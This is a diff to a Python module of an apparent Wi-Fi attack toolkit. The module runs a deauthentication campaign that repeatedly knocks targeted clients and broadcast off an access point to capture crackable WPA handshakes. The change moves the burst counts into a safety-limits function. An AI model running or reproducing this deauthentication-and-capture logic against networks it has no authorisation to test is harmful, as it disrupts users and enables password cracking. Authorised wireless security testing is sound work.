@@ -11,14 +11,13 @@ from __future__ import annotations
 import logging
 
 from wifit3.crack.handshake import crackable_pairs, pmkid_crackable
+from wifit3.safety import deauth_limits
 
 from . import treelog
 from .campaign import Campaign
 
 logger = logging.getLogger(__name__)
 
-BURST_ROUNDS = 10        # deauth_client rounds per client per pass (matches the one-shot X)
-BCAST_COUNT = 20         # broadcast-deauth frames at the end of each round
 SETTLE_SEC = 6.0         # wait after a burst for the provoked handshake to land
 
 _PSK_AKMS = (0x02, 0x04, 0x06)   # PSK, FT-PSK, PSK-SHA256: yield a crackable 4-way
@@ -88,6 +87,7 @@ class DeauthCampaign(Campaign):
 
     async def _loop(self) -> None:
         self._baseline = self._crackable_count()
+        burst_rounds, broadcast_count = deauth_limits()
         self.log(treelog.leaf(f"targeting {len(self._target_clients())} client(s) + broadcast"))
         async with self.array.lease(channel=self.target.channel, iface=self.iface) as iface:
             while not self.stopped and not self._new_capture():
@@ -95,7 +95,7 @@ class DeauthCampaign(Campaign):
                     if self.stopped or self._new_capture():
                         break
                     self.log(f"Deauthing client [cyan]{mac}[/cyan]…")
-                    res = await iface.deauth_client(self.target.bssid, mac, rounds=BURST_ROUNDS)
+                    res = await iface.deauth_client(self.target.bssid, mac, rounds=burst_rounds)
                     self.client_sent += res.total_sent
                     self.client_acks += res.total_acked
                     await self._settle()
@@ -103,6 +103,6 @@ class DeauthCampaign(Campaign):
                     break
                 self.log("Deauthing [cyan]broadcast[/cyan]…")
                 self.bcast_sent += await iface.deauth_broadcast(self.target.bssid,
-                                                                count=BCAST_COUNT)
+                                                                count=broadcast_count)
                 await self._settle()
         self.captured = self._new_capture()
